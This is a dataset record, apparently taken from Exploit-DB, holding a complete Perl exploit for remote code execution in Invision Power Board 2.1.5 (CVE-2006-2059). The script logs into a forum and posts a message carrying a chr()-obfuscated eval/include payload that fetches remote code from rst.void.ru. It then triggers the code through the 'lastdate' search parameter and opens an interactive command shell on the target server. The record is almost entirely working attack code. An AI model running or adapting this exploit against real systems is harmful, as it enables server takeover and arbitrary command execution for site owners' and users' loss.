{
  "id": "1720",
  "title": "Invision Power Board 2.1.5 - &#039;lastdate&#039; Remote Code Execution",
  "cve": "CVE-2006-2059",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n\r\n## Invision Power Board 2.* commands execution exploit by RST/GHC\r\n## vulnerable versions <= 2.1.5\r\n## tested on 2.1.4, 2.0.2\r\n##\r\n## (c)oded by 1dt.w0lf\r\n## RST/GHC\r\n## http://rst.void.ru\r\n## http://ghc.ru\r\n\r\n\r\nuse IO::Socket;\r\nuse Getopt::Std;\r\n\r\ngetopts(\"l:h:p:d:f:v:\");\r\n\r\n$host     = $opt_h;\r\n$dir      = $opt_d;\r\n$login    = $opt_l;\r\n$password = $opt_p;\r\n$forum    = $opt_f;\r\n$version  = $opt_v || 0;\r\n\r\n$|++;\r\n\r\nheader();\r\nif(!$host||!$dir||!$login||!$password||!$forum) { usage(); }\r\n\r\nprint \"[~]    SERVER : $host\\r\\n\";\r\nprint \"[~]      PATH : $dir\\r\\n\";\r\nprint \"[~]     LOGIN : $login\\r\\n\";\r\nprint \"[~]  PASSWORD : $password\\r\\n\";\r\nprint \"[~]    TARGET : $version\";\r\nprint (($version)?(' - IPB 2.1.*'):(' - IPB 2.0.*'));\r\nprint \"\\r\\n\";\r\n\r\nprint \"[~] Login ... \";\r\n\r\n$sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"[-] CONNECTION FAILED\";\r\n$login    =~ s/(.)/\"%\".uc(sprintf(\"%2.2x\",ord($1)))/eg;\r\n$password =~ s/(.)/\"%\".uc(sprintf(\"%2.2x\",ord($1)))/eg;\r\n$post     = 'UserName='.$login.'&PassWord='.$password;\r\n$loggedin = 0;\r\nprint $sock \"POST ${dir}index.php?act=Login&CODE=01 HTTP/1.1\\r\\n\";\r\nprint $sock \"Host: $host\\r\\n\";\r\nprint $sock \"Connection: close\\r\\n\";\r\nprint $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $sock \"Content-length: \".length($post).\"\\r\\n\\r\\n\";\r\nprint $sock \"$post\";\r\nprint $sock \"\\r\\n\\r\\n\";\r\nwhile (<$sock>)\r\n{  \r\n if(/session_id=([a-f|0-9]{32})/) { $sid = $1; }\r\n}\r\n$sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"[-] CONNECTION FAILED\";\r\nprint $sock \"GET ${dir}index.php HTTP/1.1\\r\\n\";\r\nprint $sock \"Host: $host\\r\\n\";\r\nprint $sock \"Cookie: session_id=$sid;\\r\\n\";\r\nprint $sock \"Connection: close\\r\\n\\r\\n\";\r\nwhile (<$sock>)\r\n{    \r\n if(/act=Login&amp;CODE=03/) { $loggedin = 1; last; }\r\n}\r\nif($loggedin) { print \" [ DONE ]\\r\\n\"; }\r\nelse { print \" [ FAILED ]\\r\\n\"; exit(); }\r\n\r\nprint \"[+] SID: $sid\\r\\n\";\r\n\r\nprint \"[~] Try get md5_check ...\";\r\n$sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"[-] CONNECTION FAILED\";\r\nif($version==1)\r\n {\r\n print $sock \"GET ${dir}index.php?act=post&do=new_post&f=${forum} HTTP/1.1\\r\\n\";\r\n }\r\nelse\r\n {\r\n print $sock \"GET ${dir}index.php?act=Post&CODE=00&f=${forum} HTTP/1.1\\r\\n\";\r\n }\r\nprint $sock \"Host: $host\\r\\n\";\r\nprint $sock \"Cookie: session_id=$sid;\\r\\n\";\r\nprint $sock \"Connection: close\\r\\n\\r\\n\";\r\nwhile (<$sock>)\r\n {  \r\n if($version == 1 && /ipb_md5_check\\s*= \\\"([a-f|0-9]{32})\\\"/)  { $md5_check = $1; last; }\r\n if($version == 0 && /auth_key' value='([a-f|0-9]{32})/) { $md5_check = $1; last; }\r\n }\r\nclose($sock);\r\nif($md5_check) { print \" [ DONE ]\\r\\n\"; print \"[+] MD5_CHECK : $md5_check\\r\\n\"; }\r\nelse { print \" [ FAILED ]\\r\\n\"; exit(); }\r\n\r\nprint \"[~] Create new message ...\";\r\n$sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"[-] CONNECTION FAILED\";\r\n$created = 0;\r\n$text = 'r57ipbxplhohohoeval(include(chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(114).chr(115).chr(116).chr(46).chr(118).chr(111).chr(105).chr(100).chr(46).chr(114).chr(117).chr(47).chr(114).chr(53)'.\r\n        '.chr(55).chr(105).chr(112).chr(98).chr(105).chr(110).chr(99).chr(46).chr(116).chr(120).chr(116))); //';\r\n$post = \"st=0&act=Post&s=&f=${forum}&auth_key=${md5_check}&removeattachid=0&CODE=01&post_key=&TopicTitle=justxpl&TopicDesc=justxpl&poll_question=&ffont=0&fsize=0&Post=${text}&enableemo=yes&enablesig=yes&iconid=0\";\r\nprint $sock \"POST ${dir}index.php HTTP/1.1\\r\\n\";\r\nprint $sock \"Host: $host\\r\\n\";\r\nprint $sock \"Cookie: session_id=$sid;\\r\\n\";\r\nprint $sock \"Connection: close\\r\\n\";\r\nprint $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $sock \"Content-length: \".length($post).\"\\r\\n\\r\\n\";\r\nprint $sock \"$post\";\r\nprint $sock \"\\r\\n\\r\\n\";\r\nwhile (<$sock>)\r\n {  \r\n if(/Location:/) { $created = 1; last; }\r\n }\r\nif($created) { print \" [ DONE ]\\r\\n\"; }\r\nelse { print \" [ FAILED ]\\r\\n\"; exit(); }\r\n\r\n$sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"[-] CONNECTION FAILED\";\r\nprint \"[~] Search message ...\";\r\n$post = 'keywords=r57ipbxplhohohoeval&namesearch='.$login.'&forums%5B%5D=all&searchsubs=1&prune=0&prune_type=newer&sort_key=last_post&sort_order=desc&search_in=posts&result_type=posts';\r\nprint $sock \"POST ${dir}index.php?act=Search&CODE=01 HTTP/1.1\\r\\n\";\r\nprint $sock \"Host: $host\\r\\n\";\r\nprint $sock \"Cookie: session_id=$sid;\\r\\n\";\r\nprint $sock \"Connection: close\\r\\n\";\r\nprint $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $sock \"Content-length: \".length($post).\"\\r\\n\\r\\n\";\r\nprint $sock \"$post\";\r\nprint $sock \"\\r\\n\\r\\n\";\r\n\r\nwhile (<$sock>)\r\n {\r\n if(/searchid=([a-f|0-9]{32})/) { $searchid = $1; last; }\r\n }\r\n\r\nif($searchid) { print \" [ DONE ]\\r\\n\"; }\r\nelse { print \"[ FAILED ]\\r\\n\"; exit(); }\r\nprint \"[+] SEARCHID: $searchid\\r\\n\";\r\n\r\n$get = 'index.php?act=Search&CODE=show&searchid='.$searchid.'&search_in=posts&result_type=posts&highlite=r57ipbxplhohohoeval&lastdate=z|eval.*?%20//)%23e%00';\r\n\r\nwhile ()\r\n {\r\n    print \"Command for execute or 'exit' for exit # \";\r\n    while(<STDIN>)\r\n     {\r\n        $cmd=$_;\r\n        chomp($cmd);\r\n        exit() if ($cmd eq 'exit');\r\n        last;\r\n     }\r\n    &run($cmd);\r\n }\r\n\r\nsub run()\r\n {\r\n  $cmd =~ s/(.*);$/$1/eg;\r\n  $cmd =~ s/(.)/\"%\".uc(sprintf(\"%2.2x\",ord($1)))/eg;\r\n  $cmd2 = '%65%63%68%6F%20%5F%53%54%41%52%54%5F%20%26%26%20';\r\n  $cmd2 .= $cmd;\r\n  $cmd2 .= '%20%26%26%20%65%63%68%6F%20%5F%45%4E%44%5F';\r\n  $sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"[-] CONNECTION FAILED\";\r\n  \r\n  print $sock \"GET ${dir}${get}&eharniy_ekibastos=$cmd2 HTTP/1.1\\r\\n\";\r\n  print $sock \"Host: $host\\r\\n\";\r\n  print $sock \"Cookie: session_id=$sid;\\r\\n\";\r\n  print $sock \"Connection: close\\r\\n\\r\\n\";\r\n\r\n  $on = 0;\r\n  $runned = 0;\r\n  while ($answer = <$sock>)\r\n   {\r\n    if ($answer =~ /^_END_/) { return 0; }\r\n    if ($on == 1) { print \"  $answer\"; }\r\n    if ($answer =~ /^_START_/) { $on = 1; }\r\n   }\r\n }\r\n \r\nsub header()\r\n {\r\n print \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";   \r\n print \" Invision Power Board 2.* commands execution exploit by RST/GHC\\r\\n\";\r\n print \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n }\r\n \r\nsub usage()\r\n {\r\n print \"r57ipbce.pl -h <host> -d <dir> -l <login> -p <password> -f <forum> -v <version>\\r\\n\\r\\n\";\r\n print \"<host>     - host where IPB installed e.g www.ipb.com\\r\\n\";\r\n print \"<dir>      - folder where IPB installed e.g. /forum/ , /ipb/ , etc...\\r\\n\";\r\n print \"<login>    - login of any exist user\\r\\n\";\r\n print \"<password> - and password too )\\r\\n\";\r\n print \"<forum>    - number of forum where user can create topic e.g 2,4, etc\\r\\n\";\r\n print \"<version>  - forum version:\\r\\n\";\r\n print \"             0 - 2.0.*\\r\\n\";\r\n print \"             1 - 2.1.*\\r\\n\";\r\n exit();\r\n }\r\n\r\n# milw0rm.com [2006-04-26]",
  "url": "https://www.exploit-db.com/exploits/1720"
}